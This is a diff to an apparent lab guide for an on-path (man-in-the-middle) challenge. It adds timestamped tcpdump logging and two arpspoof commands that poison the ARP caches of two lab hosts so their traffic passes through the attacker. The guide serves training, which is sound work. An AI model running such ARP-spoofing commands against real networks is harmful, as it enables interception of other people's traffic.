@@ -234,6 +234,19 @@ Here is the step-by-step procedure to resolve an on-path challenge (e.g., C3 or 
 	```
 	tcpdump -i eth0 -w /captures/challenge.pcap "host 172.28.0.11"
 	```
+
+	Timestamp and a file can be used to improved logging
+	```sh
+	tcpdump -i eth0 -n 2>&1 |  awk '{ print strftime("[%Y-%m-%d %H:%M:%S] [tcpdump]"), $0; fflush() }' >> lab.log &
+	```
+
+	```sh
+
+	arpspoof -i eth0 -t 172.28.0.11 172.28.0.23 2>&1 | awk '{ print strftime("[%Y-%m-%d %H:%M:%S] [arpspoof-victim]"), $0; fflush() }' >> lab.log &
+
+	arpspoof -i eth0 -t 172.28.0.23 172.28.0.11 2>&1 | awk '{ print strftime("[%Y-%m-%d %H:%M:%S] [arpspoof-server]"), $0; fflush() }' >> lab.log &
+	```
+
 5. **Arm Challenge:** Click **Arm** in the web portal (`http://localhost:5000`) with the `<target-ip>`.
 6. **Retrieve & Analyze PCAP:**
 	- Stop `tcpdump` (Ctrl+C).
